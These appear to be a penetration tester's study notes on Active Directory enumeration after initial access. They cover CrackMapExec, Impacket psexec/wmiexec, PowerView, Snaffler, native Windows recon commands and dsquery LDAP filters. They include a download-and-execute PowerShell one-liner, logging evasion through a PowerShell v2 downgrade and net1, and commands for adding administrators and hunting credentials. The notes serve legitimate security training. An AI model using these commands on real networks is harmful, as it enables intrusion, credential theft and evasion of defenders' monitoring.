```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```

All of the methods in this page focus on further enumeration once a foothold has been gained, you must have already acquired any of the following:
- A domain user's cleartext password
- A NTLM password hash
- SYSTEM access on a domain-joined host

The https://wadcoms.github.io/ cheatsheet can be really helpful here.
## From Linux
### CrackMapExec
![[CrackMapExec#Summary]]
![[CrackMapExec#User Enumeration]]
![[CrackMapExec#Group Enumeration]]
![[CrackMapExec#Currently logged on users]]
![[CrackMapExec#List SMB Shares]]
![[CrackMapExec#Crawl a SMB share]]

### SMBMap
![[SMBMap#Summary]]
![[SMBMap#Check user's access to shares]]
![[SMBMap#Recursive list of a share]]
![[SMBMap#Recursive filename pattern search]]
![[SMBMap#File content searching]]

### RPCClient
![[SMB & RPC#MSRPC / RPCclient]]

### Impacket Toolkit
#### PSEXEC
 `psexec.py` is effectively a clone of the Sysinternals psexec executable but works slightly differently as its on linux. The tool works by:
 1. Uploading a randomly-named exe to the `ADMIN$` share on the target host
 2. It then registers the service via RPC and the Windows Service Control Manager.
 3. Once established, communication happens over a named pipe, providing a `SYSTEM` shell on the target host
This tool can be used to run system level powershell commands from the linux attack host.
```bash
psexec [domain]/[user]:'[pass]'@[ip]
```

#### WMIEXEC
`wmiexec.py` is similar to `psexec.py` but utilises a semi-interactive shell to execute commands through [[WMI]]. It doesn't drop files or executables on the target and generates fewer logs, *so its slightly more stealthy*. Unfortunately, it is likely to still be detected by modern EDR and anti-virus systems.
```bash
wmiexec [domain]/[user]:'[pass]'@[ip]
```
> It will create a lot of event ID: [4688: A new process has been created](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688) as it creates a separate cmd.exe for each command run. This is normal in some orgs but could be a tip-off. It also runs under the context of the user, not `SYSTEM`.
### Windappsearch
![[Windapsearch#Summary]]
![[Windapsearch#Search for Domain Admins]]
![[Windapsearch#Search for Privileged Users]]

### Bloodhound
![[BloodHound#Summary]]
![[BloodHound#Collecting from Linux]]

## From Windows
### ActiveDirectory PowerShell Module
> Using this module on a host, rather than dropping a tool in, can make us blend in more.

To see what modules are currently installed:
```PowerShell
Get-Module
```

To load the AD module:
```PowerShell
Import-Module ActiveDirectory
```
#### Get domain info
```PowerShell
Get-ADDomain
```
> this includes useful info such as: *domain SID*, *domain function level*, *child domains*, *name* etc
#### Get users (+ filter)
```PowerShell
Get-ADUser
```
If we want to filter for users that might be susceptible to Kerberoasting:
```PowerShell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipleName
```
#### Verify domain trust relationships
```PowerShell
Get-ADTrust -Filter *
```
> this lets us explore the trust relationships of various domains and child-domains the domain has
#### Group enumeration
```PowerShell
Get-ADGroup -Filter * | select name
```
We can then take these names and get specific information on particular ones:
```PowerShell
Get-ADGroup -Identity "[groupName]"
```
#### Group Membership
```PowerShell
Get-ADGroupMember -Identity "[groupName]"
```
> this will tell us who is in a particular group

### PowerView
[PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) is a tool for PowerShell that serves to gain situational awareness in an AD environment. It provides similar information to BloodHound, providing ways to identify logged in users, enumerate domain information (eg. users, groups, ACLs, trusts), as well as perform file hunting and kerberoasting.
> it requires more manual effort to determine misconfigurations and relationships than a tool like [[BloodHound]] but can be very valuable still.

|**Command**|**Description**|
|---|---|
|`Export-PowerViewCSV`|Append results to a CSV file|
|`ConvertTo-SID`|Convert a User or group name to its SID value|
|`Get-DomainSPNTicket`|Requests the Kerberos ticket for a specified Service Principal Name (SPN) account|
|**Domain/LDAP Functions:**||
|`Get-Domain`|Will return the AD object for the current (or specified) domain|
|`Get-DomainController`|Return a list of the Domain Controllers for the specified domain|
|`Get-DomainUser`|Will return all users or specific user objects in AD|
|`Get-DomainComputer`|Will return all computers or specific computer objects in AD|
|`Get-DomainGroup`|Will return all groups or specific group objects in AD|
|`Get-DomainOU`|Search for all or specific OU objects in AD|
|`Find-InterestingDomainAcl`|Finds object ACLs in the domain with modification rights set to non-built in objects|
|`Get-DomainGroupMember`|Will return the members of a specific domain group|
|`Get-DomainFileServer`|Returns a list of servers likely functioning as file servers|
|`Get-DomainDFSShare`|Returns a list of all distributed file systems for the current (or specified) domain|
|**GPO Functions:**||
|`Get-DomainGPO`|Will return all GPOs or specific GPO objects in AD|
|`Get-DomainPolicy`|Returns the default domain policy or the domain controller policy for the current domain|
|**Computer Enumeration Functions:**||
|`Get-NetLocalGroup`|Enumerates local groups on the local or a remote machine|
|`Get-NetLocalGroupMember`|Enumerates members of a specific local group|
|`Get-NetShare`|Returns open shares on the local (or a remote) machine|
|`Get-NetSession`|Will return session information for the local (or a remote) machine|
|`Test-AdminAccess`|Tests if the current user has administrative access to the local (or a remote) machine|
|**Threaded 'Meta'-Functions:**||
|`Find-DomainUserLocation`|Finds machines where specific users are logged in|
|`Find-DomainShare`|Finds reachable shares on domain machines|
|`Find-InterestingDomainShareFile`|Searches for files matching specific criteria on readable shares in the domain|
|`Find-LocalAdminAccess`|Find machines on the local domain where the current user has local administrator access|
|**Domain Trust Functions:**||
|`Get-DomainTrust`|Returns domain trusts for the current domain or a specified domain|
|`Get-ForestTrust`|Returns all forest trusts for the current forest or a specified forest|
|`Get-DomainForeignUser`|Enumerates users who are in groups outside of the user's domain|
|`Get-DomainForeignGroupMember`|Enumerates groups with users outside of the group's domain and returns each foreign member|
|`Get-DomainTrustMapping`|Will enumerate all trusts for the current domain and any others seen.|
> This table doesn't contain everything, but has many valuable commands.

#### Get domain user info
```PowerShell
Get-DomainUser -Identity [user] -Domain [domain] | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
```
#### Recursive Group Membership
Nested groups can be incredibly dangerous for privilege escalation, eg. if the group `SecAdmins` is a nested group to `Domain Admins` then anyone in the `SecAdmins` group would inherit domain admin permissions.
```PowerShell
Get-DomainGroupMember -Identity "[groupName]" -Recurse
```
> this will display all group members (including any nested groups and its members)
#### Trust Enumeration
```PowerShell
Get-DomainTrustMapping
```
> this shows us the domain trust relationships (like [[#Verify domain trust relationships]])
#### Testing for local administrator
```PowerShell
Test-AdminAccess -ComputerName [computerName]
```
> this will show us if our current user is an admin on the local machine. This can be really useful to test for many computers to see if we can access any other local administrators
#### Finding users who are vulnerable to Kerberoasting
The SPN attribute can suggest a user is vulnerable to kerberoasting, we can filter for this:
```PowerShell
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipleName
```

### SharpView
This is a .NET port of PowerView (*as the original PV is officially deprecated, but still useful*). 
> SharpView can be really useful when PowerShell has been hardened or we need to try avoid it.
> This supports using `-Help` to see how to use a command
#### View a user
```PowerShell
.\SharpView.exe Get-DomainUser -Identity [user]
```

### Snaffler
[Snaffler](https://github.com/SnaffCon/Snaffler) is a tool for acquiring credentials or other sensitive data in an AD. It works by obtaining a list of hosts within the domain and then hunting for shares and readable directories. It iterates through any directories our user can read and hunts for files with sensitive information (*often by looking at its file extension*).

When setup correctly, SMB shares should:
- Require a user to be domain joined and required to authenticate when accessing the system.
- Permissions should ensure users can only access and see what is necessary for their daily role.

```cmd
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```
```PowerShell
.\Snaffler.exe -d [domain] -s -v data
```

### BloodHound / SharpHound
![[BloodHound#Summary]]
![[BloodHound#Collecting from Windows]]
## Living off the land in Windows
### Basic recon commands
These commands can all be summarised with `systeminfo` but being able to run individual parts sometimes can be useful to get specific information.

| Command                                                 | Result                                                                            |
| ------------------------------------------------------- | --------------------------------------------------------------------------------- |
| `hostname`                                              | Prints the PC's name                                                              |
| `[System.Environment]::OSVersion.Version`               | Prints out the OS version and revision level                                      |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patches and hotfixes applied to the host                               |
| `ipconfig /all`                                         | Prints out network adapter state and configurations                               |
| `set`                                                   | Displays a list of environment variables for the current session (*ran from CMD*) |
| `echo %USERDOMAIN%`                                     | Displays the domain name to which the host belongs (*ran from CMD*)               |
| `echo %logonserver%`                                    | Prints the name of the Domain controller the host checks in with (*ran from CMD*) |
### Useful PowerShell Cmdlets
| Cmd-Let                                                                                                    | Description                                                                                                                                                                             |
| ---------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Get-Module`                                                                                               | Lists available modules loaded for usage                                                                                                                                                |
| `Get-ExecutionPolicy -List`                                                                                | Prints the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) for each scope on a host |
| `Set-ExecutionPolicy Bypass -Scope Process`                                                                | Changes the policy for our current process using the `-Scope` parameter. This change will be reverted once we vacate the process or terminate it. (*No lasting changes*)                |
| `Get-ChildItem Env: \| ft Key,Value`                                                                       | Return env vars                                                                                                                                                                         |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`                 | Get user's powershell history, could show commands and passwords or point to valuable files                                                                                             |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('[url-to-download]'); <follow-on-cmds>"` | Quick and easy way to download a file from a url and call it from memory                                                                                                                |
### Avoiding PowerShell Logging
PowerShell was only given event logging in version 3.0+. Therefore, if we can downgrade to run version 2.0 or older, in theory, we shouldn't be logged in Event Viewer.
```PowerShell
Get-host

Name    : ConsoleHost
Version : 5.1.19041.1320 <- this is the PowerShell version
```
```PowerShell
powershell.exe -version 2
```
```PowerShell
Get-host

Name    : ConsoleHost
Version : 2.0 <- Downgraded to v2.0
```
> The best place to look for if we are not appearing in logs is: *Event Viewer > Applications and Services Logs > Microsoft > Windows > PowerShell > Operational*
> *Applications and Services Logs > Windows PowerShell* is also a good place to check.

We would expect to see the last command issued was the downgrade, and then nothing should be logged afterwards because [Script Block Logging](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.2) only works in version 3.0+.

### Checking Defences
We can use the [netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts) and [sc](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-query) utilities to gain a better feel for what defences are in place.
#### Check Firewall
```PowerShell
netsh advfirewall show allprofiles
```
#### Check if defender is running
```batch
sc query windefend
```
```PowerShell
Get-MpComputerStatus
```
> This PowerShell command can tell us useful information to report, such as: AV configuration and scan intervals. It can also give us the version so we can possibly bypass it in future attacks.

#### Checking if a user is logged in with us
If another user is logged into the same host, some of our actions could alert them of our presence, possibly costing us our foothold.
```PowerShell
qwinsta

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
 services                                    0  Disc
>console           forend                    1  Active
 rdp-tcp                                 65536  Listen
```
> This shows us that we are the only ones logged in (using the `forend` user)

#### Network Information
| Networking Commands                  | Description                                                                                                       |
| ------------------------------------ | ----------------------------------------------------------------------------------------------------------------- |
| `arp -a`                             | Lists all known hosts in the arp table                                                                            |
| `ipconfig /all`                      | Prints our adapter settings for the host, can help with mapping networking segments                               |
| `route print`                        | Displays the routing table (IPv4 & IPv6) identifying known networking and layer three routes shared with the host |
| `netsh advfirewall show allprofiles` | Displays the status of the host's firewall.                                                                       |
> Anything that appears in the routing table has been accessed frequently enough for a route to be created (or an administrator has added it). These are potential targets for lateral movement.
> [[Network Addressing#Address Resolution Protocol (ARP)]]

### Windows Management Instrumentation (WMI)
![[WMI#Summary]]

| Command                                                                                  | Description                                                                         |
| ---------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------- |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn`                                  | Prints the patch level and description of the hotfixes applied                      |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:list`     | Displays basic host information to include any attributes within the list           |
| `wmic process list /format:list`                                                         | Lists all processes on the host                                                     |
| `wmic ntdomain list /format:list`                                                        | Displays domain information & DCs                                                   |
| `wmic useraccount list /format:list`                                                     | Information about all local accounts and any domain accounts logged into the device |
| `wmic group list /format:list`                                                           | Information on local groups                                                         |
| `wmic sysaccount list /format:list`                                                      | Dumps information about any system accounts that are being used as service accounts |
| `wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress` | Gives domain, child domain, and forest information                                  |
### Net Commands
[Net](https://docs.microsoft.com/en-us/windows/win32/winsock/net-exe-2) commands can be useful when attempting to enumerate information from the domain. Typically, [Net](https://docs.microsoft.com/en-us/windows/win32/winsock/net-exe-2) is monitored by EDRs and can quickly give us away.

| **Command**                                     | **Description**                                                                                                              |
| ----------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| `net accounts`                                  | Information about password requirements                                                                                      |
| `net accounts /domain`                          | Password and lockout policy                                                                                                  |
| `net group /domain`                             | Information about domain groups                                                                                              |
| `net group "Domain Admins" /domain`             | List users with domain admin privileges                                                                                      |
| `net group "domain computers" /domain`          | List of PCs connected to the domain                                                                                          |
| `net group "Domain Controllers" /domain`        | List PC accounts of domains controllers                                                                                      |
| `net group <domain_group_name> /domain`         | User that belongs to the group                                                                                               |
| `net groups /domain`                            | List of domain groups                                                                                                        |
| `net localgroup`                                | All available groups                                                                                                         |
| `net localgroup administrators /domain`         | List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default) |
| `net localgroup Administrators`                 | Information about a group (admins)                                                                                           |
| `net localgroup administrators [username] /add` | Add user to administrators                                                                                                   |
| `net share`                                     | Check current shares                                                                                                         |
| `net user <ACCOUNT_NAME> /domain`               | Get information about a user within the domain                                                                               |
| `net user /domain`                              | List all users of the domain                                                                                                 |
| `net user %username%`                           | Information about the current user                                                                                           |
| `net use x: \computer\share`                    | Mount the share locally                                                                                                      |
| `net view`                                      | Get a list of computers                                                                                                      |
| `net view /all /domain[:domainname]`            | Shares on the domains                                                                                                        |
| `net view \computer /ALL`                       | List shares of a computer                                                                                                    |
| `net view /domain`                              | List of PCs of the domain                                                                                                    |
> Using `net1` will still run net but can sometimes evade monitoring

### Dsquery
[Dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)) is a CLI for finding AD objects. It can do similar queries to [[BloodHound]] & [[#PowerView]], but sometimes these tools aren't available. `dsquery` will exist on any host with `Active Directory Services Role` installed, and the `dsquery` DLL exists on all modern Windows systems by default now (`C:\Windows\System32\dsquery.dll`).

Once we are able to run CMD or PS as the `SYSTEM` context, we can use `dsquery`.
#### Show users
```PowerShell
dsquery user
```
#### Show computers
```PowerShell
dsquery computer
```
#### Wildcard searching
```PowerShell
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```
#### LDAP Queries
```PowerShell
# Looks for users with the `PASSWD_NOTREQD` attribute
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

# Look for all DCs in the domain, limiting to five results
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```
> `userAccountControl:1.2.840.113556.1.4.803:` Specifies that we are looking at the [User Account Control (UAC) attributes](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) for an object
> `=8192` represents the decimal bitmask we want to match in this search. This decimal number corresponds to a corresponding UAC Attribute flag that determines if an attribute like `password is not required` or `account is locked` is set. These values can compound which then changes the number.

| UAC Value | Meaning                             |
| --------- | ----------------------------------- |
| 1         | Login Script Will Execute           |
| 2         | Account is disabled                 |
| 32        | Password not required               |
| 64        | Password cant change                |
| 128       | Encrypted text password allowed     |
| 512       | Normal user account                 |
| 2048      | Inter-domain Trust account          |
| 4096      | Domain Workstation or Member server |
| 8192      | Domain Controller                   |
| 65536     | Password does not expire            |
| 524288    | Trusted for impersonation           |
| 1048576   | Account may not be impersonated     |
